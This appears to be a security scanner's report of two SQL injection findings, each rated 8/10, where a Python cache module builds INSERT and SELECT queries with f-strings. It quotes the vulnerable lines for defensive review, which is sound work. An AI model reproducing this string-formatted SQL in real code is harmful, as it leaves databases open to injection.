[!] Sql Injection (2 occurrences)
  1. Line 52: query = f"INSERT OR REPLACE INTO format_cache VALUES ('{data_hash}', '{format_type}', {timestamp}, '{result}')" [Severity: 8/10]
     This line of code is vulnerable to SQL injection because it uses string formatting to construct the SQL query instead of using parameterized queries. An attacker could potentially manipulate the 'data_hash', 'format_type', or 'result' variables to execute arbitrary SQL commands.
  2. Line 70: query = f"SELECT result FROM format_cache WHERE hash = '{data_hash}' AND format = '{format_type}'" [Severity: 8/10]
     This line of code is vulnerable to SQL injection because it uses string formatting to construct the SQL query instead of using parameterized queries. An attacker could potentially manipulate the 'data_hash' or 'format_type' variables to execute arbitrary SQL commands.
